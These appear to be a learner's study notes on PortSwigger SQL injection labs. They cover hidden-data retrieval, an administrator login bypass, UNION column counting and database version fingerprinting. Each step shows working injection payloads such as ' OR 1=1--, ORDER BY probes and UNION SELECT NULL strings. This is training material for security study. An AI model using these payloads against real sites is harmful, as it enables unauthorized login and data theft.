[PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection),
[SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data 
- When user selects a category: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1` /filter?category=Clothing%2c+shoes+and+accessories
- Solve the lab to display one or more unreleased products: `SELECT * FROM products WHERE category = '' OR 1=1 --'`/filter?category='+OR+1=1--
  - `--` is a comment indicator in SQL. Rest of the query is interpreted as a comment following this (effectively removing it). In this case, `AND released = 1` is removed. This could've been done just using the '--' to see unreleased items, but if you wanted to see unreleased items from all categories, the OR 1=1 --' works, as it is either Gifts or 1=1 is true, and since 1=1 is always true, the query returns all items.
 
## SQL injection vulnerability allowing login bypass
- When user logs in, there is a reported SQL vulnerability. Potential attempts to try include:
  - `SELECT firstname FROM users where username='administrator' and password='admin'`
  - `SELECT firstname FROM users where username=''' and password='admin'`
  - `SELECT firstname FROM users where username='administrator' --' and password='admin'` - WINNER

## SQL injection UNION attack, determining the number of columns returned by the query
- UNION attacks - retrieve data from other tables within the database. UNION allows for execution of additional SELECT queries: `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
- Two requirements for UNION attacks:
  1. Individual queries must return the same number of columns (find out how many columns are being returned from the original query)
      - Inject a series of ORDER BY clauses and incrementing the specified column index until an error occurs. `' ORDER BY 1--`, `'ORDER BY 2--`, etc.
      - Inject a series of UNION SELECT payloads with different number of null values `' UNION SELECT NULL--`, `'UNION SELECT NULL,NULL--`, etc.
        - A NullPointerException makes this method ineffective. 
  2. The data types in each column must be compatible with the individual queries (find out which columns returned from the original query are of a suitable data type to hold the results from the injected query).
- In this lab, attempted `'+ORDER+BY+2--'` through 4 and noticed 4 returned an error. Determined there were three columns.
  - Verified 3 columns by also using `'+UNION+SELECT+NULL,NULL,NULL--'` (# of nulls has to match # of columns)
 
## SQL injection attack, querying the database type and version on Oracle
- You can identify the database type and version by injecting provider-specific queries:
  - Microsoft/MySQL: `SELECT @@version`
  - Oracle: `SELECT * FROM v$version`
  - PostgreSQL: `SELECT version()`
- For example, UNION attack with following input: `' UNION SELECT @@version--`
- **REMEMBER** - you need to determine the number of columns first before performing a UNION attack.
  - Performed `' ORDER BY 2--'` - determined 2 columns, as 3 returned an error (category='+ORDER+BY+2--')

![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/cc5bd783-036f-4acc-9d71-c7452b4a7d63)

